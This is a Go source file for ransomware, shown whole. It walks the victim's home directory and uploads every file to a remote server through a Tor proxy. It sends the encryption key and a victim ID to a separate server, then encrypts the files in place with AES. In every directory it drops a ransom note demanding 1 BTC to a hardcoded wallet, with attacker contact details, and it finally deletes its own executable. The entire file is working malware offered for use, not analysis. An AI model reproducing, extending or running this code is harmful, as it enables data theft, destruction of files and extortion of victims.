package main

import (
	"client"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"passwords"
	"math/big"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"tor"

	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

var (
	// ServerBaseURL1 is the server base url injected on compile time(for keys)
	ServerBaseURL1 string
	// ServerBaseURL2 is the server base url injected on compile time(for files)
	ServerBaseURL2 string
	// Your wallet address
	Wallet = "17Zwp6cHg49G677Pkv2Xk4cxNKnDU8FkAR"
	// Your contact email
	ContactEmail = "@RealNightKing via Telegram or by email at the_nightking@proton.me"
	// The ransom to pay
	Price = "1 BTC"

	Client *client.Client
)

const BUFFERSIZE = 1024

func main() {
	var home_dir string
	home_dir, _ = os.UserHomeDir()
	var allfiles []string = ListAllfiles(home_dir)
	Client := client.New(ServerBaseURL1)
	_ = Client.UseTorTransport()
	Client2 := client.New(ServerBaseURL2)
	_ = Client2.UseTorTransport()
	torProxy := tor.New(os.Getenv("TEMP"))
	torProxy.DownloadAndExtract()
	torProxy.Start()
	defer func() {
		torProxy.Kill()
		torProxy.Clean()
	}()

	passwd, err := passwords.Generate(32, 10, 10, false, false)
	if err != nil {
		panic(err)
	}
	key := []byte(passwd)
	id, _ := rand.Int(rand.Reader, big.NewInt(1047483647))
	ID := id.String()
	sock, err := net.Dial("tcp", ServerBaseURL1+":3000") //keys server
	if err != nil {
		panic(err)
	}
	sock.Write(key)
	sock.Close()
	con, err := net.Dial("tcp", ServerBaseURL1+":3000") //keys server
	if err != nil {
		panic(err)
	}
	con.Write([]byte(ID))
	con.Close()
	for i := 0; i < len(allfiles); i++ {
		s, err := net.Dial("tcp", ServerBaseURL2+":3000") //files server
		if err != nil {
			panic(err)
		}
		sendFileToServer(s, allfiles[i])
		s.Close()
	}
	for i := 0; i < len(allfiles); i++ {
		block, err := aes.NewCipher(key)
		if err != nil {
			panic(err)
		}
		plaintext, err := os.ReadFile(allfiles[i])
		if err != nil {
			continue
		}
		ciphertext := make([]byte, aes.BlockSize+len(plaintext))
		iv := ciphertext[:aes.BlockSize]
		if _, err := io.ReadFull(rand.Reader, iv); err != nil {
			panic(err)
		}
		stream := cipher.NewCFBEncrypter(block, iv)
		stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
		os.WriteFile(allfiles[i], ciphertext, 0777)
	}
	dir, _ := os.UserHomeDir()
	var allDir []string = ListAllDir(dir)
	message := `
	<pre>
	YOUR FILES HAVE BEEN ENCRYPTED USING A
	STRONG AES-256 ALGORITHM.

	YOUR IDENTIFICATION IS
	%s

	SEND %s TO THE FOLLOWING BITCOIN WALLET
	%s

	AND AFTER PAY CONTACT %s
	SENDING YOUR IDENTIFICATION TO RECOVER.
	THE KEY IS NECESSARY TO DECRYPT YOUR FILES
	</pre>
	`
	content := []byte(fmt.Sprintf(message, ID, Price, Wallet, ContactEmail))
	for i := 0; i < len(allDir); i++ {
		ioutil.WriteFile(allDir[i]+"READ_TO_DECRYPT.html", content, 0600)
	}
	a := app.New()
	w := a.NewWindow("Ooops You have been Hacked !!!")

	hello := widget.NewLabel("All you files are gone")
	w.SetContent(container.NewVBox(
		hello,
		widget.NewButton("Click here!", func() {
			hello.SetText("Done!Please Don't forget to read the READ_TO_DECRYPT.html file")
		}),
	))
	w.ShowAndRun()
	home_dir, _ = os.Executable()
	os.Remove(home_dir)
}
func ListAllfiles(path string) (paths []string) {
	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
		if err != nil {
			return filepath.SkipDir
		}
		if !info.IsDir() {
			paths = append(paths, fullpath)
		}
		return nil
	})
	return paths
}
func sendFileToServer(connection net.Conn, filePath string) {
	//A client has connected
	defer connection.Close()
	file, err := os.Open(filePath)
	if err != nil {
		panic(err)
		return
	}
	fileInfo, err := file.Stat()
	if err != nil {
		panic(err)
		return
	}
	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
	fileName := fillString(fileInfo.Name(), 64)
	//Sending filename and filesize!
	connection.Write([]byte(fileSize))
	connection.Write([]byte(fileName))
	sendBuffer := make([]byte, BUFFERSIZE)
	for {
		_, err = file.Read(sendBuffer)
		if err == io.EOF {
			break
		}
		connection.Write(sendBuffer)
	}
	return
}
func fillString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString < toLength {
			retunString = retunString + ":"
			continue
		}
		break
	}
	return retunString
}
func ListAllDir(path string) (paths []string) {
	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
		if err != nil {
			return filepath.SkipDir
		}
		if info.IsDir() {
			paths = append(paths, fullpath)
		}
		return nil
	})
	return paths
}
